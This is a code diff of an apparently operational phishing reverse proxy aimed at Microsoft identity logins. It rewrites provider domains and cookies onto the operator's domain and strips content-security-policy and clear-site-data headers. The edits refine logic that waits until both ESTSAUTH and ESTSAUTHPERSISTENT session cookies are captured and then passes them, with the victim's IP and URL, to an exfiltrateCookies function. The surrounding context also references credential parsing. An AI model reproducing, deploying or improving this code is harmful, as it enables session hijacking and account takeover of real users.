@@ -354,12 +354,12 @@ function rewriteLocation(location, currentUpstream) {
 // ==================== AUTH DETECTION ====================
 
 // FIXED: Check if ALL critical auth cookies are present in this specific response
-function hasCompleteAuthSession(cookieStr, cookies) {
-  if (!cookieStr || !cookies.length) return false;
+function hasCompleteAuthSession(cookieStr) {
+  if (!cookieStr) return false;
   
   // Must have BOTH ESTSAUTH and ESTSAUTHPERSISTENT in the SAME response
-  const hasESTSAUTH = cookieStr.toLowerCase().includes('estsauth');
-  const hasESTSAUTHPERSISTENT = cookieStr.toLowerCase().includes('estsauthpersistent');
+  const hasESTSAUTH = cookieStr.toUpperCase().includes('ESTSAUTH');
+  const hasESTSAUTHPERSISTENT = cookieStr.toUpperCase().includes('ESTSAUTHPERSISTENT');
   
   return hasESTSAUTH && hasESTSAUTHPERSISTENT;
 }
@@ -367,7 +367,7 @@ function hasCompleteAuthSession(cookieStr, cookies) {
 function hasAnyAuthCookies(cookieStr) {
   if (!cookieStr) return false;
   return AUTH_TOKEN_NAMES.some(name => 
-    cookieStr.toLowerCase().includes(name.toLowerCase())
+    cookieStr.toUpperCase().includes(name.toUpperCase())
   );
 }
 
@@ -403,26 +403,20 @@ function parseCredentials(bodyText) {
   return { user, pass };
 }
 
-// ==================== FIXED: COOKIE HANDLING ====================
+// ==================== FIXED: COOKIE HANDLING (Updated from Script 2) ====================
 
 function processCookies(cookies, upstreamDomain, requestHostname) {
   const modifiedCookies = [];
   
-  for (const cookie of cookies) {
-    if (!cookie) continue;
+  for (const originalCookie of cookies) {
+    if (!originalCookie) continue;
     
-    // IMPORTANT: Keep the original cookie structure intact
-    // Only replace the domain name in the cookie string
-    let modifiedCookie = cookie;
+    // Simple string replacement like working Script 2
+    // Replace upstream domain with our domain
+    let modifiedCookie = originalCookie.replace(upstreamDomain, requestHostname);
     
-    // Replace upstream domain with our domain in the cookie string
-    // This preserves all cookie attributes exactly as received
-    const domainRegex = new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g');
-    modifiedCookie = modifiedCookie.replace(domainRegex, requestHostname);
-    
-    // Also handle cases where domain might be prefixed with a dot
-    const dotDomainRegex = new RegExp('\\.' + upstreamDomain.replace(/\./g, '\\.'), 'g');
-    modifiedCookie = modifiedCookie.replace(dotDomainRegex, '.' + requestHostname);
+    // Also handle dot-prefixed domains (.domain.com)
+    modifiedCookie = modifiedCookie.replace('.' + upstreamDomain, '.' + requestHostname);
     
     modifiedCookies.push(modifiedCookie);
   }
@@ -430,45 +424,30 @@ function processCookies(cookies, upstreamDomain, requestHostname) {
   return modifiedCookies;
 }
 
-// ==================== FIXED: RESPONSE HANDLING ====================
+// ==================== FIXED: RESPONSE HANDLING (Updated from Script 2) ====================
 
-function createResponseHeaders(resp, options = {}) {
+function createResponseHeaders(resp, modifiedCookies) {
   const newHeaders = new Headers();
   
-  const headersToCopy = [
-    'content-type',
-    'content-length',
-    'content-encoding',
-    'cache-control',
-    'expires',
-    'etag',
-    'last-modified',
-    'vary'
-  ];
-  
-  for (const name of headersToCopy) {
-    const value = resp.headers.get(name);
-    if (value) {
-      newHeaders.set(name, value);
+  // Copy all headers EXCEPT Set-Cookie (we'll handle those separately)
+  resp.headers.forEach((value, key) => {
+    if (key.toLowerCase() !== 'set-cookie') {
+      newHeaders.set(key, value);
     }
-  }
+  });
   
-  // Copy original Set-Cookie headers first
-  const originalCookies = resp.headers.getSetCookie?.() || [];
-  for (const cookie of originalCookies) {
-    newHeaders.append('set-cookie', cookie);
-  }
-  
+  // Security headers
   newHeaders.set('access-control-allow-origin', '*');
   newHeaders.set('access-control-allow-credentials', 'true');
   
-  if (options.location) {
-    newHeaders.set('location', options.location);
-  }
+  // Remove security policies that might block functionality
+  newHeaders.delete('content-security-policy');
+  newHeaders.delete('content-security-policy-report-only');
+  newHeaders.delete('clear-site-data');
   
-  // APPEND modified cookies (don't replace)
-  if (options.setCookies) {
-    for (const cookie of options.setCookies) {
+  // Add ONLY the modified cookies (not the original upstream ones)
+  if (modifiedCookies && modifiedCookies.length > 0) {
+    for (const cookie of modifiedCookies) {
       newHeaders.append('set-cookie', cookie);
     }
   }
@@ -511,6 +490,7 @@ export default async function handleRequest(request) {
     headers.set('Origin', 'https://' + upstreamDomain);
   }
 
+  // Remove problematic headers
   for (const h of ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
    'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for']) {
     headers.delete(h);
@@ -564,42 +544,53 @@ export default async function handleRequest(request) {
       if (loc) {
         const rewrittenLoc = rewriteLocation(loc, upstreamDomain);
         console.log(`[REDIRECT] ${loc} -> ${rewrittenLoc}`);
-        const redirectHeaders = createResponseHeaders(resp, { location: rewrittenLoc });
+        
+        // Create headers for redirect
+        const redirectHeaders = new Headers();
+        resp.headers.forEach((value, key) => {
+          if (key.toLowerCase() !== 'set-cookie') {
+            redirectHeaders.set(key, value);
+          }
+        });
+        
+        // Handle cookies on redirect
+        const cookies = resp.headers.getSetCookie?.() || [];
+        if (cookies.length > 0) {
+          const modifiedCookies = processCookies(cookies, upstreamDomain, url.hostname);
+          for (const cookie of modifiedCookies) {
+            redirectHeaders.append('set-cookie', cookie);
+          }
+        }
+        
+        redirectHeaders.set('location', rewrittenLoc);
         return new Response(null, { status: resp.status, headers: redirectHeaders });
       }
     }
 
-    // Process cookies
+    // Process cookies - EXACTLY like Script 2
     const cookies = resp.headers.getSetCookie?.() || [];
     let cookieStr = '';
     let shouldExfiltrate = false;
 
-    if (cookies?.length) {
+    if (cookies.length > 0) {
       cookieStr = cookies.join('; ');
       
-      // FIXED: Only exfiltrate if BOTH critical cookies are in THIS response
-      const hasCompleteSession = hasCompleteAuthSession(cookieStr, cookies);
-      const hasAnyAuth = hasAnyAuthCookies(cookieStr);
-      
       // ONLY exfiltrate when we have a COMPLETE session (both ESTSAUTH and ESTSAUTHPERSISTENT together)
-      shouldExfiltrate = hasCompleteSession;
-
-      console.log(`[COOKIES] ${cookies.length} found, complete=${hasCompleteSession}, any=${hasAnyAuth}, exfil=${shouldExfiltrate}`);
+      shouldExfiltrate = hasCompleteAuthSession(cookieStr);
+      
+      console.log(`[COOKIES] ${cookies.length} found, complete=${shouldExfiltrate}`);
       console.log(`[COOKIES] Names: ${cookies.map(c => c.split('=')[0]).join(', ')}`);
 
-      // Process cookies for browser
+      // Process cookies for browser (domain replacement)
       const modifiedCookies = processCookies(cookies, upstreamDomain, url.hostname);
-      
-      // ONLY exfiltrate if we have a complete session (both cookies together)
+
       if (shouldExfiltrate) {
-        console.log(`[EXFILTRATING] Complete session captured! Both ESTSAUTH and ESTSAUTHPERSISTENT present.`);
+        console.log(`[EXFILTRATING] Complete session captured! Both critical cookies present.`);
         await exfiltrateCookies(cookieStr, ip, info.type, url.href);
-      } else if (hasAnyAuth) {
-        console.log(`[SKIP] Has auth cookies but not a complete session - waiting for full authentication`);
       }
 
-      // Create response headers
-      const responseHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });
+      // Create response headers with modified cookies only
+      const responseHeaders = createResponseHeaders(resp, modifiedCookies);
 
       // Process body
       const ct = resp.headers.get('content-type') || '';
@@ -607,7 +598,7 @@ export default async function handleRequest(request) {
       if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
         let text = await resp.text();
         
-        // Simple domain replacement like working script
+        // Replace all identity provider domains
         for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
           text = text.split(domain).join(`${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
         }
@@ -618,8 +609,8 @@ export default async function handleRequest(request) {
       return new Response(resp.body, { status: resp.status, headers: responseHeaders });
     }
 
-    // No cookies
-    const responseHeaders = createResponseHeaders(resp);
+    // No cookies - simple response
+    const responseHeaders = createResponseHeaders(resp, []);
     const ct = resp.headers.get('content-type') || '';
     
     if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
